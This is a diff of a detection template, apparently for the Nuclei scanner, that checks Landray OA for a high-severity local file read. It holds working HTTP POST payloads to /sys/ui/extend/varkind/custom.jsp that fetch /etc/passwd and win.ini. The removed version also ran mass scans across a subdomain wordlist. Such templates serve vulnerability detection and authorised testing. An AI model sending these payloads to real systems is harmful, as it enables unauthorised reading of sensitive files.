@@ -1,42 +1,39 @@
-id: landray-oa-fileread 1
+id: landray-oa-fileread
+
 info:
-  author: pikpikcu
   name: Landray-OA Fileread
-  reference: https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
+  author: pikpikcu
   severity: high
+  reference: https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
   tags: landray,lfi
+
 requests:
-- attack: sniper
-  matchers:
-  - regex:
-    - 'root:.*:0:0:'
-    type: regex
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  payloads:
-    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-  raw:
-  - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+  - raw:
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
 
-    Host: {{Subdomains}}
+        var={"body":{"file":"file:///etc/passwd"}}
 
-    User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like
-    Gecko) Chrome/41.0.2225.0 Safari/537.36
+      - |
+        POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
 
-    Connection: close
+        var={"body":{"file":"file:///c://windows/win.ini"}}
 
-    Content-Length: 44
+    matchers-condition: and
+    matchers:
 
-    Accept: */*
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "for 16-bit app support"
+        condition: or
 
-    Accept-Language: en
-
-    Content-Type: application/x-www-form-urlencoded
-
-
-    var={"body":{"file":"file:///etc/passwd"}}
-
-    '
-  threads: 100
+      - type: status
+        status:
+          - 200
